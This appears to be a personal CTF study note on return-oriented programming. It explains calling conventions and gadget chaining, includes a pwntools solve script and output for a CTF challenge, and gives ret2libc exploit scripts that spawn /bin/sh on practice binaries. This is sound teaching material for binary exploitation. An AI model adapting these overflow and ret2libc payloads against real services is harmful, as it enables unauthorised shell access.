---
title: "ROP (return oriented programming)"
date: 2026-07-21
description: "ROP (return oriented programming)"
tags: [pwn, theory, rop]
type: note
---

# ROP (return oriented programming)


The basis of ROP is chaining together small chunks of code already present within the binary itself in such a way to do what you wish. This often involves passing parameters to functions already present within `libc`, such as `system` - if you can find the location of a command, such as `cat flag.txt`, and then pass it *as a parameter* to `system`, it will execute that command and return the output. A more dangerous command is `/bin/sh`, which when run by `system` gives the attacker a shell much like the shellcode we used did.


first we need to understand calling conventions for param passing :

## Calling Conventions
To be able to call functions, there needs to be an agreed-upon way to pass arguments. If a program is entirely self-contained in a binary, the compiler would be free to decide the calling convention. However in reality, shared libraries are used so that common code (e.g. libc) can be stored once and dynamically linked in to programs that need it, reducing program size.

In Linux binaries, there are really only two commonly used calling conventions: cdecl for 32-bit binaries, and SysV for 64-bit

cdecl
In 32-bit binaries on Linux, function arguments are passed in on the stack in reverse order. A function like this:

```c
int add(int a, int b, int c) {
    return a + b + c;
} //would be invoked by pushing c, then b, then a.
```


### SysV

- For 64-bit binaries, function arguments are first passed in certain registers:

- RDI
 - RSI
- RDX
- RCX
- R8
- R9
  - then any leftover arguments are pushed onto the stack in reverse order, as in cdecl.




# Gadgets

Gadgets are small snippets of code followed by a `ret` instruction, e.g. `pop rdi; ret`. We can manipulate the `ret` of these gadgets in such a way as to string together a large chain of them to do what we want.

### Example

Let's for a minute pretend the stack looks like this during the execution of a `pop rdi; ret` gadget.



What happens is fairly obvious - for eg `0x10` gets popped into `rdi` as it is at the top of the stack during the `pop rdi`. Once the `pop` occurs, `rsp` moves:


And since `ret` is equivalent to `pop rip`, ex :`0x5655576724` gets moved into `rip`. 

### Utilising Gadgets

When we overwrite the return pointer, we overwrite the value pointed at by `rsp`. Once that value is popped, it points at the next value at the stack - but wait. We can overwrite the next value in the stack.

Let's say that we want to exploit a binary to jump to a `pop rdi; ret` gadget, pop `0x100` into `rdi` then jump to `flag()`. Let's step-by-step the execution.



On the *original* `ret`, which we overwrite the return pointer for, we pop the gadget address in. Now `rip` moves to point to the gadget, and `rsp` moves to the next memory address.



`rsp` moves to the `0x100`; `rip` to the `pop rdi`. Now when we pop, `0x100` gets moved into `rdi`.



RSP moves onto the next items on the stack, the address of `flag()`. The `ret` is executed and `flag()` is called.

### Summary

Essentially, if the gadget pops values from the stack, simply place those values afterwards (including the `pop rip` in `ret`). If we want to pop `0x10` into `rdi` and then jump to `0x16`, our payload would look like this:



Note if you have multiple `pop` instructions, you can just add more values.


We use `rdi` as an example because, if you remember, that's the register for the first parameter in 64-bit. This means control of this register using this gadget is important.
{% endhint %}

### Finding Gadgets

We can use the tool [`ROPgadget`](https://github.com/JonathanSalwan/ROPgadget) to find possible gadgets.

```
$ ROPgadget --binary vuln-64

Gadgets information
============================================================
0x0000000000401069 : add ah, dh ; nop dword ptr [rax + rax] ; ret
0x000000000040109b : add bh, bh ; loopne 0x40110a ; nop ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401024
[...]
```

Combine it with `grep` to look for specific registers.

```
$ ROPgadget --binary vuln-64 | grep rdi

0x0000000000401096 : or dword ptr [rdi + 0x404030], edi ; jmp rax
0x00000000004011db : pop rdi ; ret
```


# Example ROP challenge solved in Citadel : 

in a chall called return of stack i used a ret gagdget to align our payload.

```py
win_addr = 0x4011a0   
ret_gadget = 0x40101a  



print(f"win() address: {hex(win_addr)}")
print(f"ret gadget: {hex(ret_gadget)}")
print()

# Connect to remote server
print("connect ti host")
io = remote(HOST, PORT)

# Receive the banner
io.recvuntil(b'cooked.')


# Buffer is 0x48
# Add ret gadget for x64 stack alignment
#  Add win() address 
offset = 72
payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(win_addr)

print(f"sending offset: {offset}, length: {len(payload)})")
io.sendline(payload)

print("server output : ")
response = io.recvall(timeout=2)

print(response)

print()
print(response.decode('latin-1', errors='ignore'))

io.close()
print("closed and if it reached here itll work i think")

```

output : 
```py
C:\Citadel_CTF_Writeups\Return_Of_Stack>python exploit_final.py
win() address: 0x4011a0
ret gadget: 0x40101a

connect ti host
[x] Opening connection to chall_citadel.cryptonitemit.in on port 56743
[x] Opening connection to chall_citadel.cryptonitemit.in on port 56743: Trying 74.225.246.247
[+] Opening connection to chall_citadel.cryptonitemit.in on port 56743: Done
sending offset: 72, length: 88)
server output :
[x] Receiving all data
[x] Receiving all data: 1B
[x] Receiving all data: 33B
[x] Receiving all data: 52B
[+] Receiving all data: Done (52B)
[*] Closed connection to chall_citadel.cryptonitemit.in port 56743
b'\ncitadel{4lw4y5_b0rr0w_&_r3turn}\nyou got the solve!\n'


citadel{4lw4y5_b0rr0w_&_r3turn}
you got the solve!

closed and if it reached here itll work i think

```


# ret2libc exploitation example (source in resouces)

- we can use pwntools to simplify the exploit but here it ha been done manually to learn the inner workings

## Manual Exploitation

### Getting Libc and its base

Fortunately Linux has a command called `ldd` for dynamic linking. If we run it on our compiled ELF file, it'll tell us the libraries it uses and their base addresses.

```
$ ldd vuln-32 
	linux-gate.so.1 (0xf7fd2000)
	libc.so.6 => /lib32/libc.so.6 (0xf7dc2000)
	/lib/ld-linux.so.2 (0xf7fd3000)
```

We need `libc.so.6`, so the base address of libc is `0xf7dc2000`.

{% hint style="info" %}
Libc base and the system and /bin/sh offsets may be different for you. This isn't a problem - it just means you have a different libc version. Make sure you use **your** values.
{% endhint %}

### Getting the location of system()

To call system, we obviously need its location in memory. We can use the `readelf` command for this.

```
$ readelf -s /lib32/libc.so.6 | grep system

1534: 00044f00    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0
```

The `-s` flag tells `readelf` to search for symbols, for example functions. Here we can find the offset of system from libc base is `0x44f00`.

### Getting the location of /bin/sh

Since `/bin/sh` is just a string, we can use `strings` on the dynamic library we just found with `ldd`. Note that when passing strings as parameters you need to pass a **pointer** to the string, not the hex representation of the string, because that's how C expects it.

```
$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
18c32b /bin/sh
```

`-a` tells it to scan the entire file; `-t x` tells it to output the offset in hex.

### 32-bit Exploit

```python
from pwn import *

p = process('./vuln-32')

libc_base = 0xf7dc2000
system = libc_base + 0x44f00
binsh = libc_base + 0x18c32b

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

### 64-bit Exploit

Repeat the process with the `libc` linked to the 64-bit exploit (should be called something like `/lib/x86_64-linux-gnu/libc.so.6`).

Note that instead of passing the parameter in after the return pointer, you will have to use a `pop rdi; ret` gadget to put it into the RDI register.

```
$ ROPgadget --binary vuln-64 | grep rdi

[...]
0x00000000004011cb : pop rdi ; ret
```

```python
from pwn import *

p = process('./vuln-64')

libc_base = 0x7ffff7de5000
system = libc_base + 0x48e20
binsh = libc_base + 0x18a143

POP_RDI = 0x4011cb

payload = b'A' * 72         # The padding
payload += p64(POP_RDI)     # gadget -> pop rdi; ret
payload += p64(binsh)       # pointer to command: /bin/sh
payload += p64(system)      # Location of system
payload += p64(0x0)         # return pointer - not important once we get the shell

p.clean()
p.sendline(payload)
p.interactive()
```

## Automating with Pwntools

Unsurprisingly, pwntools has a bunch of features that make this much simpler.

```python
# 32-bit
from pwn import *

elf = context.binary = ELF('./vuln-32')
p = process()

libc = elf.libc                        # Simply grab the libc it's running with
libc.address = 0xf7dc2000              # Set base address

system = libc.sym['system']            # Grab location of system
binsh = next(libc.search(b'/bin/sh'))  # grab string location

payload = b'A' * 76         # The padding
payload += p32(system)      # Location of system
payload += p32(0x0)         # return pointer - not important once we get the shell
payload += p32(binsh)       # pointer to command: /bin/sh

p.clean()
p.sendline(payload)
p.interactive()
```

The 64-bit looks essentially the same.



# Resources Used

https://ropemporium.com/

https://ctf101.org/binary-exploitation/return-oriented-programming/


https://www.youtube.com/watch?v=8zRoMAkGYQE

https://ir0nstone.gitbook.io/notes/binexp/stack/return-oriented-programming/ret2libc
